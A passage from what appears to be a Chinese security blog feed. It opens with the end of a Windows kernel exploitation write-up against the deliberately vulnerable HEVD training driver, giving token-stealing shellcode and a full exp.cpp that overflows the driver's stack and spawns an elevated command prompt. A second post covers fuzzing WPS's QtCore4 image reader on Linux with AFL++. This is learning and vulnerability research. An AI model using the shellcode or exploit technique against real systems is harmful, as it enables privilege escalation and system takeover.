Token.RefCntand r11, 7mov rdx, 4h                         ; WIN 7 SP1 SYSTEM process PID &#x3D; 0x4           SearchSystemPID:mov rax, [rax + 188h]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flinksub rax, 188hcmp [rax + 180h], rdx               ; Get nt!_EPROCESS.UniqueProcessId jne SearchSystemPIDmov rdx, [rax + 208h]               ; Get SYSTEM process nt!_EPROCESS.Tokenand rdx, 0fffffffffffffff0hor rdx, r11mov [rcx + 208h], rdx</code></pre><p>备份一下<code>x86</code>的</p><pre><code class="hljs assembly">pushad                              ; Save registers state; Start of Token Stealing Stubxor eax, eax                        ; Set ZEROmov eax, DWORD PTR fs:[eax + 124h]  ; Get nt!_KPCR.PcrbData.CurrentThread                                    ; _KTHREAD is located at FS : [0x124]mov eax, [eax + 50h]                ; Get nt!_KTHREAD.ApcState.Processmov ecx, eax                        ; Copy current process _EPROCESS structuremov edx, 04h                        ; WIN 7 SP1 SYSTEM process PID &#x3D; 0x4SearchSystemPID:mov eax, [eax + 0B8h]               ; Get nt!_EPROCESS.ActiveProcessLinks.Flinksub eax, 0B8hcmp[eax + 0B4h], edx                ; Get nt!_EPROCESS.UniqueProcessIdjne SearchSystemPIDmov edx, [eax + 0F8h]               ; Get SYSTEM process nt!_EPROCESS.Tokenmov[ecx + 0F8h], edx                ; Replace target process nt!_EPROCESS.Token                                    ; with SYSTEM process nt!_EPROCESS.Token</code></pre><h3 id="exp-cpp"><a href="#exp-cpp" class="headerlink" title="exp.cpp"></a>exp.cpp</h3><p>最终<code>exp</code>如下，这里的<code>shellcode</code>我是通过<code>nasm</code>进行编译的，然后再通过<code>hexdump -e &#39;16/1 &quot;%02x&quot; &quot; | &quot;&#39; -e &#39;16/1 &quot;%_p&quot; &quot;\n&quot;&#39; ./1.o</code> 变成可见字符的<code>16</code>进制，再转换的（没找到啥比较优雅的方式</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// open device </span>    HANDLE dev = CreateFileA(<span class="hljs-string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);    <span class="hljs-keyword">if</span> (dev == INVALID_HANDLE_VALUE)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open failed\n&quot;</span>);        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Device Handle: 0x%p\n&quot;</span>, dev);    <span class="hljs-comment">/* nasm -f elf64 ./1.s </span><span class="hljs-comment">    xor rax, rax                    ; Set ZERO</span><span class="hljs-comment">    mov rax, gs:[rax + 188h]        ; Get nt!_KPCR.PcrbData.CurrentThread</span><span class="hljs-comment">                                    ; _KTHREAD is located at GS : [0x188]</span><span class="hljs-comment"></span><span class="hljs-comment">    mov rax, [rax + 70h]            ; Get nt!_KTHREAD.ApcState.Process</span><span class="hljs-comment">    mov rcx, rax                    ; Copy current process _EPROCESS structure</span><span class="hljs-comment">    mov r11, rcx                    ; Store Token.RefCnt</span><span class="hljs-comment">    and r11, 7</span><span class="hljs-comment"></span><span class="hljs-comment">    mov rdx, 4h                     ; WIN 7 SP1 SYSTEM process PID = 0x4</span><span class="hljs-comment"></span><span class="hljs-comment">    SearchSystemPID:</span><span class="hljs-comment">        mov rax, [rax + 188h]           ; Get nt!_EPROCESS.ActiveProcessLinks.Flink</span><span class="hljs-comment">        sub rax, 188h</span><span class="hljs-comment">        cmp [rax + 180h], rdx            ; Get nt!_EPROCESS.UniqueProcessId</span><span class="hljs-comment">        jne SearchSystemPID</span><span class="hljs-comment"></span><span class="hljs-comment">    mov rdx, [rax + 208h]           ; Get SYSTEM process nt!_EPROCESS.Token</span><span class="hljs-comment">    and rdx, 0fffffffffffffff0h</span><span class="hljs-comment">    or rdx, r11</span><span class="hljs-comment">    mov [rcx + 208h], rdx</span><span class="hljs-comment">    */</span>         CHAR shellcode[] =    &#123;        <span class="hljs-comment">// push rax; push rbx; push rcx; push rdx; push rdi; push rsi; push r8; push r9; push r10; push r11; push r12; push r13; push r14; push r15</span>        <span class="hljs-string">&quot;\x50\x53\x51\x52\x57\x56\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57&quot;</span>                <span class="hljs-comment">// change token</span>        <span class="hljs-string">&quot;\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x48\x89\xc1\x49\x89\xcb\x49\x83\xe3\x07\xba\x04\x00\x00\x00\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xea\x48\x8b\x90\x08\x02\x00\x00\x48\x83\xe2\xf0\x4c\x09\xda\x48\x89\x91\x08\x02\x00\x00&quot;</span>                <span class="hljs-comment">// pop r15; pop r14; pop r13; pop r12; pop r11; pop r10; pop r9; pop r8; pop rsi; pop rdi; pop rdx; pop rcx; pop rbx; pop rax;</span>        <span class="hljs-string">&quot;\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5e\x5f\x5a\x59\x5b\x58&quot;</span>        <span class="hljs-string">&quot;\x48\x83\xc4\x28&quot;</span><span class="hljs-comment">// add rsp, 0x28</span>        <span class="hljs-string">&quot;\xc3&quot;</span><span class="hljs-comment">// ret</span>    &#125;;    LPVOID addr = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);    <span class="hljs-keyword">if</span> (addr == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;VirtualAlloc failed\n&quot;</span>);        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;    &#125;    RtlCopyMemory(addr, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));    CHAR* chBuffer;    <span class="hljs-keyword">int</span> chBufferLen = <span class="hljs-number">0x818</span>;        chBuffer = (CHAR*)<span class="hljs-built_in">malloc</span>(chBufferLen + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span> + <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer, <span class="hljs-number">0xff</span>, chBufferLen);    <span class="hljs-comment">//memset(chBuffer + chBufferLen, 0x41, 0x8);</span>    *(INT64*)(chBuffer + chBufferLen) = (INT64)addr;    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x8</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x8</span>);    <span class="hljs-built_in">memset</span>(chBuffer + chBufferLen + <span class="hljs-number">0x10</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x8</span>);    DWORD size_returned = <span class="hljs-number">0</span>;    BOOL is_ok = DeviceIoControl(dev, <span class="hljs-number">0x222003</span>, chBuffer, chBufferLen + <span class="hljs-number">0x18</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;size_returned, <span class="hljs-literal">NULL</span>);    CloseHandle(dev);    system(<span class="hljs-string">&quot;pause&quot;</span>);    system(<span class="hljs-string">&quot;start cmd&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>需要注意的是编写<code>exp</code>，最后需要能让<code>ioctl</code>的<code>handler</code>不崩溃的返回，才可以再起<code>cmd</code>，得到一个提权之后的进程，因此要恢复<code>ret</code>到<code>BufferOverflowStackIoctlHandler</code>之后的<code>add rsp, 0x28; ret</code>指令</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://bbs.pediy.com/thread-270159.htm">https://bbs.pediy.com/thread-270159.htm</a><br><a href="https://h0mbre.github.io/HEVD_Stackoverflow_64bit/">https://h0mbre.github.io/HEVD_Stackoverflow_64bit/</a><br><a href="https://www.anquanke.com/post/id/245528">https://www.anquanke.com/post/id/245528</a><br><a href="https://50u1w4y.github.io/site/HEVD/homePage/">https://50u1w4y.github.io/site/HEVD/homePage/</a><br><a href="https://www.abatchy.com/2018/01/kernel-exploitation-2">https://www.abatchy.com/2018/01/kernel-exploitation-2</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Learning</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对wps的qtcore的某一接口fuzz</title>
    <link href="/2022/03/29/wps%20fuzz/"/>
    <url>/2022/03/29/wps%20fuzz/</url>
    
    <content type="html"><![CDATA[<p>主要看到以下三篇<code>blog</code></p><blockquote><p><a href="http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html">http://zeifan.my/security/rce/heap/2020/09/03/wps-rce-heap.html</a><br><a href="https://www.anquanke.com/post/id/240938">https://www.anquanke.com/post/id/240938</a><br><a href="https://ruan777.github.io/2021/06/02/%E4%BD%BF%E7%94%A8winafl%E5%AF%B9qtcore%E7%9A%84%E4%B8%80%E6%AC%A1fuzz%E5%B0%9D%E8%AF%95">https://ruan777.github.io/2021/06/02/使用winafl对qtcore的一次fuzz尝试</a></p></blockquote><p>因此尝试对<code>linux</code>上的<code>wps</code>的<code>qtcore4</code>进行<code>fuzz</code></p><pre><code class="hljs yaml"><span class="hljs-string">环境：</span><span class="hljs-attr">linux:</span> <span class="hljs-string">ubuntu</span> <span class="hljs-number">20.04</span><span class="hljs-attr">wps:</span> <span class="hljs-number">11.1</span><span class="hljs-number">.0</span><span class="hljs-number">.10161</span><span class="hljs-attr">libcQtCore:</span> <span class="hljs-number">4.7</span><span class="hljs-number">.4</span></code></pre><h2 id="整体的逻辑"><a href="#整体的逻辑" class="headerlink" title="整体的逻辑"></a>整体的逻辑</h2><p>根据<code>Nafiez</code>的报告，可以知道，主要是<code>kso.dll</code>中调用<code>QtCore4.dll</code>的<code>QImageReader::read()</code>出错的，因此后续两篇文章均对于<code>QtCore4.dll</code>的该接口进行<code>fuzz</code></p><pre><code class="hljs apache"><span class="hljs-attribute">0</span>:<span class="hljs-number">000</span>&gt; !heap -p -a cc<span class="hljs-number">53</span>afbc    <span class="hljs-attribute">address</span> cc<span class="hljs-number">53</span>afbc found in    <span class="hljs-attribute">_DPH_HEAP_ROOT</span> @ <span class="hljs-number">6731000</span>    <span class="hljs-attribute">in</span> busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)                                <span class="hljs-attribute">cc36323c</span>:         cc<span class="hljs-number">53</span>afa<span class="hljs-number">8</span>               <span class="hljs-number">58</span> -         cc<span class="hljs-number">53</span>a<span class="hljs-number">000</span>             <span class="hljs-number">2000</span>    <span class="hljs-attribute">6f13ab70</span> verifier!AVrfDebugPageHeapAllocate+<span class="hljs-number">0</span>x<span class="hljs-number">00000240</span>    <span class="hljs-attribute">77a9909b</span> ntdll!RtlDebugAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">00000039</span>    <span class="hljs-attribute">779ebbad</span> ntdll!RtlpAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>ed    <span class="hljs-attribute">779eb0cf</span> ntdll!RtlpAllocateHeapInternal+<span class="hljs-number">0</span>x<span class="hljs-number">0000022</span>f    <span class="hljs-attribute">779eae8e</span> ntdll!RtlAllocateHeap+<span class="hljs-number">0</span>x<span class="hljs-number">0000003</span>e    <span class="hljs-attribute">6f080269</span> MSVCR<span class="hljs-number">100</span>!malloc+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>b    <span class="hljs-attribute">6f08233b</span> MSVCR<span class="hljs-number">100</span>!operator new+<span class="hljs-number">0</span>x<span class="hljs-number">0000001</span>f    <span class="hljs-attribute">6b726c67</span> QtCore<span class="hljs-number">4</span>!QImageData::create+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>fa    <span class="hljs-attribute">6b726b54</span> QtCore<span class="hljs-number">4</span>!QImage::QImage+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>e    <span class="hljs-attribute">6b7a0e21</span> QtCore<span class="hljs-number">4</span>!png_get_text+<span class="hljs-number">0</span>x<span class="hljs-number">00000436</span>    <span class="hljs-attribute">6b79d7a8</span> QtCore<span class="hljs-number">4</span>!QImageIOHandler::setFormat+<span class="hljs-number">0</span>x<span class="hljs-number">000000</span>de    <span class="hljs-attribute">6b79d457</span> QtCore<span class="hljs-number">4</span>!QPixmapData::fromFile+<span class="hljs-number">0</span>x<span class="hljs-number">000002</span>bf    <span class="hljs-attribute">6b725eb4</span> QtCore<span class="hljs-number">4</span>!QImageReader::read+<span class="hljs-number">0</span>x<span class="hljs-number">000001</span>e<span class="hljs-number">2</span>    <span class="hljs-attribute">6d0ca585</span> kso!kpt::VariantImage::forceUpdateCacheImage+<span class="hljs-number">0</span>x<span class="hljs-number">0000254</span>e    <span class="hljs-attribute">6d0c5964</span> kso!kpt::Direct<span class="hljs-number">2</span>DPaintEngineHelper::operator=+<span class="hljs-number">0</span>x<span class="hljs-number">00000693</span>    <span class="hljs-attribute">6d0c70d0</span> kso!kpt::RelativeRect::unclipped+<span class="hljs-number">0</span>x<span class="hljs-number">00001146</span>    <span class="hljs-attribute">6d0c8d0c</span> kso!kpt::VariantImage::forceUpdateCacheImage+<span class="hljs-number">0</span>x<span class="hljs-number">00000</span>cd<span class="hljs-number">5</span>    <span class="hljs-attribute">6d451d5c</span> kso!BlipCacheMgr::BrushCache+<span class="hljs-number">0</span>x<span class="hljs-number">0000049</span>a    <span class="hljs-attribute">6d451e85</span> kso!BlipCacheMgr::GenerateBitmap+<span class="hljs-number">0</span>x<span class="hljs-number">0000001</span>d    <span class="hljs-attribute">6d453227</span> kso!BlipCacheMgr::GenCachedBitmap+<span class="hljs-number">0</span>x<span class="hljs-number">00000083</span>    <span class="hljs-attribute">6d29bb92</span> kso!drawing::PictureRenderLayer::render+<span class="hljs-number">0</span>x<span class="hljs-number">000009</span>b<span class="hljs-number">6</span>    <span class="hljs-attribute">6d450fb1</span> kso!drawing::RenderTargetImpl::paint+<span class="hljs-number">0</span>x<span class="hljs-number">00000090</span>    <span class="hljs-attribute">6d29b528</span> kso!drawing::PictureRenderLayer::render+<span class="hljs-number">0</span>x<span class="hljs-number">0000034</span>c    <span class="hljs-attribute">6d2a2d83</span> kso!drawing::VisualRenderer::render+<span class="hljs-number">0</span>x<span class="hljs-number">00000060</span>    <span class="hljs-attribute">6d2b8970</span> kso!drawing::SingleVisualRenderer::drawNormal+<span class="hljs-number">0</span>x<span class="hljs-number">000002</span>b<span class="hljs-number">5</span>    <span class="hljs-attribute">6d2b86a7</span> kso!drawing::SingleVisualRenderer::draw+<span class="hljs-number">0</span>x<span class="hljs-number">000001</span>e<span class="hljs-number">1</span>    <span class="hljs-attribute">6d2b945e</span> kso!drawing::SingleVisualRenderer::draw+<span class="hljs-number">0</span>x<span class="hljs-number">00000046</span>    <span class="hljs-attribute">6d3d0142</span> kso!drawing::ShapeVisual::paintEvent+<span class="hljs-number">0</span>x<span class="hljs-number">0000044</span>a    <span class="hljs-attribute">680a2b5c</span> wpsmain!WpsShapeTreeVisual::getHittestSubVisuals+<span class="hljs-number">0</span>x<span class="hljs-number">000068</span>f<span class="hljs-number">1</span>    <span class="hljs-attribute">6d0e36df</span> kso!AbstractVisual::visualEvent+<span class="hljs-number">0</span>x<span class="hljs-number">00000051</span>    <span class="hljs-attribute">6d3cbe97</span> kso!drawing::ShapeVisual::visualEvent+<span class="hljs-number">0</span>x<span class="hljs-number">0000018</span>f    <span class="hljs-attribute">6d0eba90</span> kso!VisualPaintEvent::arriveVisual+<span class="hljs-number">0</span>x<span class="hljs-number">0000004</span>e</code></pre><p>后续两篇文章<code>fuzz</code>的代码逻辑为</p><pre><code class="hljs maxima">QImage <span class="hljs-built_in">image</span>;QImageReader reader;QString image_file_name;# <span class="hljs-built_in">transform</span> (char[] <span class="hljs-built_in">file_name</span>) to (QString image_file_name)reader.setFileName(image_file_name)reader.<span class="hljs-built_in">read</span>(<span class="hljs-built_in">image</span>);</code></pre><h2 id="从windows到linux"><a href="#从windows到linux" class="headerlink" title="从windows到linux"></a>从windows到linux</h2><p>在迁移的时候，就去找了一下对应的<code>libQtCore.so.4.7.4</code>的接口，得到了以下的代码</p><pre><code class="hljs c"><span class="hljs-comment">// gcc -g -masm=intel ./qt_reader.c -ldl -no-pie -o qt_reader</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;dlfcn.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><span class="hljs-function"></span>&#123;    dlopen(<span class="hljs-string">&quot;/path/libc++.so.1&quot;</span>, RTLD_LAZY);    dlopen(<span class="hljs-string">&quot;/path/libpng12.so.0&quot;</span>, RTLD_LAZY);    dlopen(<span class="hljs-string">&quot;/path/libc++abi.so.1&quot;</span>, RTLD_LAZY);    <span class="hljs-keyword">void</span>* handle = dlopen(<span class="hljs-string">&quot;/path/libQtCore.so.4.7.4&quot;</span>, RTLD_LAZY);    <span class="hljs-keyword">if</span> (handle == <span class="hljs-number">0</span>)    &#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;open handle failed&quot;</span>);        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, dlerror());        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;        <span class="hljs-comment">// QImageReader::QImageReader(QImageReader *this)</span>    <span class="hljs-keyword">void</span> (*qt_qimageReader)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReaderC2Ev&quot;</span>);    <span class="hljs-comment">// QImageReader::read(QImageReader *this, QImage *a2)</span>    <span class="hljs-keyword">void</span> (*qt_qimageReader_read)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReader4readEP6QImage&quot;</span>);    <span class="hljs-comment">// QImageReader::setFileName(QImageReader *this, const QString *a2)</span>    <span class="hljs-keyword">void</span> (*qt_setFileName)() = dlsym(handle, <span class="hljs-string">&quot;_ZN12QImageReader11setFileNameERK7QString&quot;</span>);    <span class="hljs-comment">// QString::QString(QString *this, const QChar *)</span>    <span class="hljs-keyword">void</span> (*qt_qstring)() = dlsym(handle, <span class="hljs-string">&quot;_ZN7QStringC2EPK5QChar&quot;</span>);    <span class="hljs-comment">// QString::fromLatin1(QString *this, const char *, unsigned int)</span>    <span class="hljs-keyword">void</span> (*qt_qstring_fromlatin1)() = dlsym(handle, <span class="hljs-string">&quot;_ZN7QString10fromLatin1EPKci&quot;</span>);    <span class="hljs-comment">// QImage::QImage(QImage *this)</span>    <span class="hljs-keyword">void</span> (*qt_qimage)() = dlsym(handle, <span class="hljs-string">&quot;_ZN6QImageC2Ev&quot;</span>);    <span class="hljs-comment">// QFile::exists(QFile *__hidden this)</span>    <span class="hljs-keyword">void</span> (*qt_qfile_exits)() = dlsym(handle, <span class="hljs-string">&quot;_ZNK5QFile6existsEv&quot;</span>);    <span class="hljs-comment">// QFile::close()</span>    <span class="hljs-keyword">void</span> (*qt_close)() = dlsym(handle, <span class="hljs-string">&quot;_ZN5QFile5closeEv&quot;</span>);    <span class="hljs-keyword">char</span>* image = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<span class="hljs-keyword">char</span>* qstring = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<span class="hljs-keyword">char</span>* reader = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);    <span class="hljs-keyword">char</span>* file_name = argv[<span class="hljs-number">1</span>];    <span class="hljs-comment">// pusha</span>    __asm__ __volatile__(        <span class="hljs-string">&quot;push rax\n&quot;</span>        <span class="hljs-string">&quot;push rbx\n&quot;</span>        <span class="hljs-string">&quot;push rcx\n&quot;</span>          <span class="hljs-string">&quot;push rdx\n&quot;</span>              <span class="hljs-string">&quot;push rbp\n&quot;</span>              <span class="hljs-string">&quot;push rdi\n&quot;</span>              <span class="hljs-string">&quot;push rsi\n&quot;</span>              <span class="hljs-string">&quot;push r8\n&quot;</span>              <span class="hljs-string">&quot;push r9\n&quot;</span>              <span class="hljs-string">&quot;push r10\n&quot;</span>              <span class="hljs-string">&quot;push r11\n&quot;</span>              <span class="hljs-string">&quot;push r12\n&quot;</span>              <span class="hljs-string">&quot;push r13\n&quot;</span>              <span class="hljs-string">&quot;push r14\n&quot;</span>              <span class="hljs-string">&quot;push r15\n&quot;</span>        <span class="hljs-string">&quot;push r15\n&quot;</span>);    <span class="hljs-comment">// QImage::QImage(image)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(image), <span class="hljs-string">&quot;a&quot;</span>(qt_qimage)    );        <span class="hljs-comment">// QImageReader::QImageReader(reader)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_qimageReader)    );    <span class="hljs-comment">// **************** This is a wrong interface of transforming the char to QString ***********************</span>    <span class="hljs-comment">// // QString::QString(qstring, file_name)</span>    <span class="hljs-comment">// __asm__ __volatile__ (</span>    <span class="hljs-comment">//     &quot;call rax\n&quot;</span>    <span class="hljs-comment">//     :</span>    <span class="hljs-comment">//     : &quot;D&quot;(qstring), &quot;S&quot;(file_name), &quot;a&quot;(qt_qstring)</span>    <span class="hljs-comment">// );</span>    <span class="hljs-comment">// QString::fromLatin1(QString *this, const char *, unsigned int)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(qstring), <span class="hljs-string">&quot;S&quot;</span>(file_name), <span class="hljs-string">&quot;d&quot;</span>(<span class="hljs-built_in">strlen</span>(file_name)), <span class="hljs-string">&quot;a&quot;</span>(qt_qstring_fromlatin1)    );    <span class="hljs-comment">// QImageReader::setFileName(reader, qstring)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;S&quot;</span>(qstring), <span class="hljs-string">&quot;a&quot;</span>(qt_setFileName)    );    <span class="hljs-comment">// QFile::exits(qfile) qfile = reader+0x10</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;mov rsi, [rdi]\n&quot;</span>        <span class="hljs-string">&quot;mov rdi, [rsi+0x10]\n&quot;</span>        <span class="hljs-string">&quot;call rax\n&quot;</span>        <span class="hljs-string">&quot;test al, al\n&quot;</span>        <span class="hljs-string">&quot;je error\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_qfile_exits)    );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;file exists&quot;</span>);    <span class="hljs-comment">// QImageReader::read(reader, qimage)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;S&quot;</span>(image), <span class="hljs-string">&quot;a&quot;</span>(qt_qimageReader_read)    );        <span class="hljs-comment">// QFile::close()</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;mov rsi, [rdi]\n&quot;</span>        <span class="hljs-string">&quot;mov rdi, [rsi+0x10]\n&quot;</span>        <span class="hljs-string">&quot;call rax\n&quot;</span>        <span class="hljs-string">&quot;jmp out\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_close)    );    <span class="hljs-comment">// error:</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;error:\n&quot;</span>    );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error: file not exists&quot;</span>);    <span class="hljs-comment">// popa</span>    __asm__ __volatile__(        <span class="hljs-string">&quot;out:\n&quot;</span>        <span class="hljs-string">&quot;pop r15\n&quot;</span>        <span class="hljs-string">&quot;pop r15\n&quot;</span>        <span class="hljs-string">&quot;pop r14\n&quot;</span>        <span class="hljs-string">&quot;pop r13\n&quot;</span>        <span class="hljs-string">&quot;pop r12\n&quot;</span>        <span class="hljs-string">&quot;pop r11\n&quot;</span>        <span class="hljs-string">&quot;pop r10\n&quot;</span>        <span class="hljs-string">&quot;pop r9\n&quot;</span>        <span class="hljs-string">&quot;pop r8\n&quot;</span>        <span class="hljs-string">&quot;pop rsi\n&quot;</span>        <span class="hljs-string">&quot;pop rdi\n&quot;</span>        <span class="hljs-string">&quot;pop rbp\n&quot;</span>        <span class="hljs-string">&quot;pop rdx\n&quot;</span>        <span class="hljs-string">&quot;pop rcx\n&quot;</span>        <span class="hljs-string">&quot;pop rbx\n&quot;</span>        <span class="hljs-string">&quot;pop rax\n&quot;</span>        );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>这个地方，最开始写的时候，撸了一版跟后两篇一样的接口的代码，但是发现覆盖率并没有上升，最后调的时候，发现在<code>reader.read()</code>的第一次判断支持的文件格式（<code>bmp, png, jpg ...</code>）以及文件是否存在时，就发现程序自身就走到了<code>File Not found</code>的地方</p><p>无奈只能重新调试程序，最后找到了一个<code>QFile::exists()</code>接口，调试的时候，发现<code>QFile</code>中存储的路径的<code>QString</code>跟我用<code>QString::QString()</code>的数据结构并不一致，就换了一个<code>QString::fromLatin1()</code>接口，就能成功地跑起来了</p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>在写好板子之后就想要用<code>afl</code>的<code>qemu_mode</code>进行插桩<code>fuzz</code>，折腾了半天，感觉<code>afl</code>原本的<code>qemu</code>版本以及<code>patch</code>和<code>libc</code>的接口都太老了</p><p>最后听学长的直接整<code>afl++</code>的<code>qemu_mode</code></p><p>最初<code>fuzz</code>起来的时候，并没过多的设置，但是这样的话是全插桩，像<code>dlopen</code>的一些库都是不关心以及没必要的，而且在<code>afl++</code>的窗口也看的出来，基本上覆盖率都是不上升的，而且极低（0.10%）</p><p>利用<code>./afl-qemu-trace -D 1.txt -d exec,nochain ./qt_reader /tmp/1.png</code>记录下来<code>trace</code>，发现不同文件的<code>trace</code>差距还是很明显的，说明代码并没有写崩</p><p>最后利用<code>export AFL_INST_LIBS=1</code>给库函数也插桩之后就可以跑起来了</p><p>另外也可以通过<code>AFL_QEMU_INST_RANGES</code>设置<code>range</code>，进行范围的插桩，通过以下代码获取相关<code>.so</code>的内存地址范围</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">lm</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">link_map</span>*)<span class="hljs-title">handle</span>;</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;base:%p\n&quot;</span>, lm-&gt;l_addr);</code></pre><p>另外翻了一下<code>afl</code>的源码，可以看到如果<code>cur_loc &gt;= afl_inst_rms</code>则<code>return</code>，所以如果给库插桩还是要注意是否超过了<code>MAP_SIZE</code>，否则最后的比较关心的<code>.so</code>没插桩上</p><pre><code class="hljs c"><span class="hljs-comment">/* Instrumentation ratio: */</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> afl_inst_rms = MAP_SIZE;<span class="hljs-comment">/* The equivalent of the tuple logging routine from afl-as.h. */</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afl_maybe_log</span><span class="hljs-params">(abi_ulong cur_loc)</span> </span>&#123;  <span class="hljs-keyword">static</span> __thread abi_ulong prev_loc;  <span class="hljs-comment">/* Optimize for cur_loc &gt; afl_end_code, which is the most likely case on</span><span class="hljs-comment">     Linux systems. */</span>  <span class="hljs-keyword">if</span> (cur_loc &gt; afl_end_code || cur_loc &lt; afl_start_code || !afl_area_ptr)    <span class="hljs-keyword">return</span>;  <span class="hljs-comment">/* Looks like QEMU always maps to fixed locations, so ASAN is not a</span><span class="hljs-comment">     concern. Phew. But instruction addresses may be aligned. Let&#x27;s mangle</span><span class="hljs-comment">     the value to get something quasi-uniform. 